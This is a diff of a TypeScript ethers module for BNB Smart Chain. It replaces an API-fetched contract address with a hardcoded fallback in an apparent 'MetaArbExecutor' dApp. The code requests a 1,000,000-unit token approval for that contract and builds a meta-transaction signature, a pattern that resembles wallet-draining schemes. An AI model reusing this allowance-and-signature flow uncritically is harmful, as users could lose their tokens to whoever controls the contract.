@@ -1,26 +1,8 @@
 import { ethers } from 'ethers';
 
-// Cache for contract address
-let contractAddressCache: string | null = null;
-
-// Get contract address from universal API storage
-export async function getContractAddress(): Promise<string> {
-  if (contractAddressCache) return contractAddressCache;
-  
-  try {
-    const response = await fetch('/api/get-contract');
-    const data = await response.json();
-    contractAddressCache = data.address;
-    return data.address;
-  } catch (error) {
-    console.error('[v0] Error fetching contract address:', error);
-    return process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0x23F417BBc7d15ed099A0a6B4556e616282F0D19E";
-  }
-}
-
 export const CONFIG = {
   RPC_URL: process.env.NEXT_PUBLIC_BSC_RPC_URL || "https://bnb-mainnet.g.alchemy.com/v2/demo",
-  CONTRACT_ADDRESS: "", // Will be set dynamically
+  CONTRACT_ADDRESS: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0x23F417BBc7d15ed099A0a6B4556e616282F0D19E",
   TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0x55d398326f99059fF775485246999027B3197955",
   OWNER_CAP: process.env.NEXT_PUBLIC_OWNER_CAP || "1000000"
 };
@@ -211,11 +193,10 @@ export async function switchToBSC() {
 }
 
 export async function approveToken(signer: ethers.Signer) {
-  const contractAddress = await getContractAddress();
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
   const decimals = await token.decimals().catch(() => 18);
   const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
-  const tx = await token.approve(contractAddress, ownerCapRaw);
+  const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
   await tx.wait();
   return tx;
 }
@@ -225,11 +206,10 @@ export async function prepareAndSignTransaction(
   provider: ethers.BrowserProvider,
   userAddress: string
 ) {
-  const contractAddress = await getContractAddress();
   const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
   const [decimals, allowance, balance] = await Promise.all([
     token.decimals().catch(() => 18),
-    token.allowance(userAddress, contractAddress),
+    token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
     token.balanceOf(userAddress)
   ]);
 
@@ -245,7 +225,7 @@ export async function prepareAndSignTransaction(
     name: 'MetaArbExecutor', 
     version: '1', 
     chainId: Number(chainId), 
-    verifyingContract: contractAddress 
+    verifyingContract: CONFIG.CONTRACT_ADDRESS 
   };
   const types = { 
     MetaTransaction: [ 
@@ -257,7 +237,7 @@ export async function prepareAndSignTransaction(
     ] 
   };
 
-  const executor = new ethers.Contract(contractAddress, EXECUTOR_ABI, provider);
+  const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
   const nonce = await executor.nonces(userAddress);
   const deadline = Math.floor(Date.now() / 1000) + 3600;
 
